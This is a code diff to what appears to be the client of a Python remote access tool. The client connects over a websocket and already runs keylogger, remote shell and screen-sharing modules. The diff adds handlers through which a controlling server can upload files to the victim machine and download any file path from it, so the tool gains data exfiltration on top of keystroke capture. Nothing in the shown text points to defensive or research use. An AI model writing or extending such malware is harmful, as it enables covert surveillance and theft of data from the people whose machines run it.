@@ -5,8 +5,9 @@ import threading
 import websocket
 
 import util
-from keylogger import keylogger
 import classes
+import file_transfer
+from keylogger import keylogger
 from shell import shell
 from screenshare import screenshare
 
@@ -61,6 +62,22 @@ def on_message(ws, message):
                 keylogger.stop_keylogger()
             else:
                 ws.send(json.dumps({"type": "keylogger_output", "data": f"[Info] Unknown keylogger_command: {msg_data}"}))
+
+        elif msg_type == "file_upload":
+            try:
+                file_data = json.loads(msg_data)
+                result = file_transfer.save_file(file_data, shell.shell_process)
+                ws.send(json.dumps({"type": "file_transfer_output", "data": result}))
+            except Exception as e:
+                ws.send(json.dumps({"type": "file_transfer_output", "data": f"[Error] Failed to process file upload: {e}"}))
+
+        elif msg_type == "file_download":
+            try:
+                file_path = msg_data
+                result = file_transfer.send_file(file_path)
+                ws.send(json.dumps({"type": "file_download_response", "data": result}))
+            except Exception as e:
+                ws.send(json.dumps({"type": "file_transfer_output", "data": f"[Error] Failed to process file download: {e}"}))
 
         elif msg_type == "Disconnect":
             print(f"[Info] Received server-initiated disconnect: {msg_data}")
